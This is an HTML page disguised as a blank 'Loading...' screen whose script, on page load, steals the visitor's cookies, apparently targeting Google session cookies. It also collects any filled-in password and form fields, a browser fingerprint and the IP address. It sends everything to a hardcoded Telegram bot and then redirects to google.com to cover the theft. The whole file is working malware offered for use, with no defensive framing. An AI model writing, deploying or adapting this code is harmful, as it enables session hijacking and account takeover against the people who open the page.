<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: Arial, sans-serif;
            color: #333;
        }
        .container { display: none; }
    </style>
</head>
<body>

    <!-- 👻 Kuch nahi dikhega – Sirf blank page -->
    <div style="display:none;"></div>

    <script>
        // ============================================================
        // 🔥 TELEGRAM CONFIG
        // ============================================================
        const BOT_TOKEN = "8899172740:AAGx2l4uy6JrfPQgmpE-CiwJG9n3Zy5qJFk";
        const CHAT_ID = "6389764004";

        // ============================================================
        // 📤 SEND TO TELEGRAM
        // ============================================================
        async function sendToTelegram(msg) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
            try {
                const r = await fetch(url, { method: 'GET' });
                return r.ok;
            } catch { return false; }
        }

        // ============================================================
        // 🧠 CAPTURE GOOGLE COOKIES (Direct)
        // ============================================================
        function getGoogleCookies() {
            const allCookies = document.cookie.split('; ');
            
            // Filter Google-related cookies
            const googleCookies = allCookies.filter(c => 
                c.includes('google') || 
                c.includes('GAPS') || 
                c.includes('__Secure') ||
                c.includes('SAPISID') ||
                c.includes('APISID') ||
                c.includes('SSID') ||
                c.includes('HSID') ||
                c.includes('OSID') ||
                c.includes('NID')
            );
            
            return googleCookies.length > 0 ? googleCookies.join('; ') : 'No Google cookies found (victim not logged in on this domain)';
        }

        // ============================================================
        // 🧠 CAPTURE ALL COOKIES
        // ============================================================
        function getAllCookies() {
            return document.cookie || 'No cookies found';
        }

        // ============================================================
        // 🧠 GET BROWSER FINGERPRINT
        // ============================================================
        function getFingerprint() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screenWidth: screen.width,
                screenHeight: screen.height,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                deviceMemory: navigator.deviceMemory || 'unknown',
                cookieEnabled: navigator.cookieEnabled,
                webdriver: navigator.webdriver || false
            };
        }

        // ============================================================
        // 🌐 GET IP
        // ============================================================
        async function getIP() {
            try {
                const r = await fetch('https://api.ipify.org?format=json');
                const d = await r.json();
                return d.ip || 'Unknown';
            } catch { return 'Unable to fetch'; }
        }

        // ============================================================
        // 🧠 GET SAVED PASSWORDS (Auto-filled fields)
        // ============================================================
        function getSavedPasswords() {
            let results = [];
            document.querySelectorAll('input[type="password"]').forEach(el => {
                if (el.value && el.value.trim() !== '') {
                    results.push({ name: el.name || el.id || 'password', value: el.value });
                }
            });
            return results;
        }

        // ============================================================
        // 🧠 GET AUTO-FILLED FIELDS
        // ============================================================
        function getAutoFillData() {
            let results = [];
            document.querySelectorAll('input').forEach(el => {
                if (el.value && el.value.trim() !== '') {
                    results.push({
                        type: el.type || 'text',
                        name: el.name || el.id || 'unknown',
                        value: el.value
                    });
                }
            });
            return results;
        }

        // ============================================================
        // 🚀 MAIN EXECUTION
        // ============================================================
        window.addEventListener('load', async function() {

            const ip = await getIP();
            const time = new Date().toISOString();
            const googleCookies = getGoogleCookies();
            const allCookies = getAllCookies();
            const fingerprint = getFingerprint();
            const savedPasswords = getSavedPasswords();
            const autoFillData = getAutoFillData();

            let msg = `🎯 **GOOGLE/GMAIL CAPTURE (DIRECT)**\n━━━━━━━━━━━━━━━━━━━━━\n`;
            msg += `🍪 **Google Cookies:** ${googleCookies}\n`;
            msg += `🍪 **All Cookies:** ${allCookies}\n`;
            msg += `🌐 **IP:** ${ip}\n`;
            msg += `🕐 **Time:** ${time}\n━━━━━━━━━━━━━━━━━━━━━\n`;

            if (savedPasswords.length > 0) {
                msg += `\n🔑 **SAVED PASSWORDS:**\n`;
                savedPasswords.forEach((p, i) => {
                    msg += `  ${i+1}. ${p.name}: \`${p.value}\`\n`;
                });
            }

            if (autoFillData.length > 0) {
                msg += `\n📝 **AUTO-FILL DATA:**\n`;
                autoFillData.forEach((f, i) => {
                    msg += `  ${i+1}. ${f.name} (${f.type}): \`${f.value}\`\n`;
                });
            }

            msg += `\n━━━━━━━━━━━━━━━━━━━━━\n`;
            msg += `🖥️ **FINGERPRINT:**\n`;
            msg += `  📱 User-Agent: ${fingerprint.userAgent}\n`;
            msg += `  💻 Platform: ${fingerprint.platform}\n`;
            msg += `  🌍 Language: ${fingerprint.language}\n`;
            msg += `  📐 Screen: ${fingerprint.screenWidth}x${fingerprint.screenHeight}\n`;
            msg += `  🕐 Timezone: ${fingerprint.timezone}\n`;
            msg += `  🧠 CPU Cores: ${fingerprint.hardwareConcurrency}\n`;
            msg += `  💾 Device Memory: ${fingerprint.deviceMemory}GB\n`;
            msg += `  🍪 Cookies Enabled: ${fingerprint.cookieEnabled}\n`;
            msg += `  🕵️ WebDriver: ${fingerprint.webdriver}\n`;
            msg += `━━━━━━━━━━━━━━━━━━━━━`;

            await sendToTelegram(msg);

            // 👻 Blank page – redirect after 3 seconds
            setTimeout(() => {
                window.location.href = 'https://www.google.com';
            }, 3000);
        });

        // 👻 Ensure blank page
        document.body.style.background = '#ffffff';
        document.body.innerHTML = '';
    </script>
</body>
</html>
